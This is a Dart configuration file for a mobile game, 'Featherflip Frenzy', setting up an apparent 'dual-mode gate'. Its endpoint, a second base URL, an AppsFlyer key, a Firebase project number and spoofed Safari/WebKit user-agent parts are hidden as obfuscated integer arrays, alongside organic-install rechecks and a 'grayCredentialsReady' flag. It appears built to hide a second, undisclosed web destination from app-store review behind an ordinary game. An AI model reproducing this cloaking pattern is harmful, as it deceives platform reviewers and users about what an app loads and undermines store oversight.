import '../core/flip_codec.dart';

/// Credentials and timings for the dual-mode gate.
/// Privacy / support stay plaintext — they are already public store URLs.
abstract final class FlipGateConfig {
  static const String appTitle = 'Featherflip Frenzy';
  static const String bundleId = 'com.featherflipfrenzy.featherflipfrenzygame';
  static const String iosStoreId = '6802366515';

  static const String privacyUrl =
      'https://featherflipfrenzy.com/privacy-policy.html';
  static const String supportUrl = 'https://featherflipfrenzy.com/support.html';

  /// Skip hides the invite until the next launch after this delay (2 d 22 h 7 m).
  static const int pushSnoozeSeconds = 252420;
  static const int organicRecheckSeconds = 10;
  static const int savedUrlExpiryDays = 8;
  static const int configPostTimeoutSeconds = 22;
  static const int installSignalSeconds = 8;
  static const int attPromptDelayMs = 670;

  static const List<int> _endpoint = <int>[
    65, 83, 90, 52, 98, 86, 69, 77, 77, 122, 66, 101, 68, 106, 115, 117, 116,
    85, 103, 121, 101, 66, 112, 106, 79, 69, 78, 68, 120, 72, 48, 99, 85, 72,
    99, 50, 81, 107, 115, 117, 99, 104, 107, 114, 101, 85, 52, 101, 80, 105, 52,
    73, 65, 81, 61, 61,
  ];
  static const List<int> _gcd = <int>[
    65, 83, 90, 52, 98, 86, 69, 77, 77, 122, 66, 102, 67, 68, 52, 112, 117, 85,
    90, 117, 102, 119, 90, 54, 79, 48, 78, 100, 50, 72, 89, 85, 66, 122, 111,
    54, 81, 65, 108, 111, 102, 119, 85, 120, 102, 107, 115, 86, 84, 122, 111,
    66, 66, 83, 82, 54, 67, 82, 100, 51, 80, 122, 56, 61,
  ];
  static const List<int> _webkit = <int>[88, 50, 73, 53, 77, 120, 77, 89, 76, 83, 111, 61];
  static const List<int> _safari = <int>[87, 71, 111, 105, 75, 65, 61, 61];
  static const List<int> _safariTail = <int>[88, 50, 73, 52, 77, 120, 77, 61];
  static const List<int> _appsFlyerKey = <int>[
    77, 84, 116, 85, 100, 71, 107, 69, 88, 48, 49, 83, 87, 65, 65, 115, 118,
    108, 56, 122, 86, 83, 73, 56, 79, 108, 74, 84, 108, 65, 61, 61,
  ];
  static const List<int> _firebaseProject = <int>[
    85, 87, 73, 54, 76, 104, 111, 80, 76, 67, 89, 65, 87, 87, 74, 111,
  ];
  static const List<int> _uaProduct = <int>[
    74, 68, 49, 50, 100, 69, 53, 97, 102, 84, 65, 78, 82, 87, 111, 61,
  ];
  static const List<int> _uaPlatformPrefix = <int>[
    81, 84, 116, 99, 100, 85, 49, 89, 101, 83, 81, 89, 75, 65, 111, 80, 47, 85,
    81, 81, 100, 104, 108, 107, 76, 81, 86, 43, 56, 103, 61, 61,
  ];
  static const List<int> _uaPlatformSuffix = <int>[
    66, 84, 116, 110, 101, 65, 74, 55, 102, 88, 119, 89, 74, 65, 108, 54, 104,
    81, 81, 61,
  ];
  static const List<int> _uaEngine = <int>[
    75, 67, 74, 56, 99, 85, 100, 104, 101, 88, 49, 122, 65, 105, 53, 49, 54, 120,
    49, 49, 77, 69, 99, 107, 101, 82, 65, 82, 105, 86, 103, 117, 102, 82, 81, 90,
    65, 81, 90, 116, 101, 66, 48, 103, 80, 50, 65, 99, 99, 122, 85, 80, 87, 65,
    61, 61,
  ];
  static const List<int> _uaMobileToken = <int>[
    74, 68, 49, 117, 100, 69, 53, 84, 77, 121, 52, 78, 76, 109, 116, 117, 53, 81,
    61, 61,
  ];

  static String get endpoint => unfoldYard(_endpoint);
  static String get gcdBase => unfoldYard(_gcd);
  static String get webKitVersion => unfoldYard(_webkit);
  static String get safariVersion => unfoldYard(_safari);
  static String get safariTail => unfoldYard(_safariTail);
  static String get appsFlyerKey => unfoldYard(_appsFlyerKey);
  static String get firebaseProjectNumber => unfoldYard(_firebaseProject);
  static String get uaProduct => unfoldYard(_uaProduct);
  static String get uaPlatformPrefix => unfoldYard(_uaPlatformPrefix);
  static String get uaPlatformSuffix => unfoldYard(_uaPlatformSuffix);
  static String get uaEngine => unfoldYard(_uaEngine);
  static String get uaMobileToken => unfoldYard(_uaMobileToken);

  static String get storeToken => 'id$iosStoreId';

  static bool get grayCredentialsReady =>
      endpoint.isNotEmpty &&
      appsFlyerKey.isNotEmpty &&
      firebaseProjectNumber.isNotEmpty;
}
